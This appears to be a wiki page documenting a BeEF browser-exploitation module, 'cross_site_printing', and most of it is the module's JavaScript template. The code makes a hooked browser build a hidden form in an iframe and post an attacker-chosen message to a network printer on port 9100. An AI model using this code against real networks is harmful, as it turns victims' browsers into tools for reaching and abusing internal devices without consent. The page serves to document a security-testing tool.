## Summary

* **Objective**: Send message to printers through the browser
* **Authors**: bcoles
* **Browsers**: Firefox

* [Code](https://github.com/beefproject/beef/tree/master/modules/ipec/cross_site_printing)

## Internal Working

Default port is 9100.

Creates a form inside of an iframe to send the message to a printer. The message to the printer is usually just the plaintext of the content you want to print.

```js

// create form
var action = "http://" + ip + ":" + port + "/";
myform=document.createElement("form");
myform.setAttribute("name","data");
myform.setAttribute("method","post");
myform.setAttribute("enctype","multipart/form-data");
myform.setAttribute("action",action);
iframe.contentWindow.document.body.appendChild(myform);

// create message textarea
myExt = document.createElement("textarea");
myExt.setAttribute("id","msg_<%= @command_id %>");
myExt.setAttribute("name","msg_<%= @command_id %>");
myExt.setAttribute("wrap","none");
myExt.setAttribute("rows","70");
myExt.setAttribute("cols","100");
myform.appendChild(myExt);

// send message
iframe.contentWindow.document.getElementById("msg_<%= @command_id %>").value = "<%= @msg.gsub(/"/, '\\"').gsub(/\r?\n/, '\\n') %>";
```

## Feedback

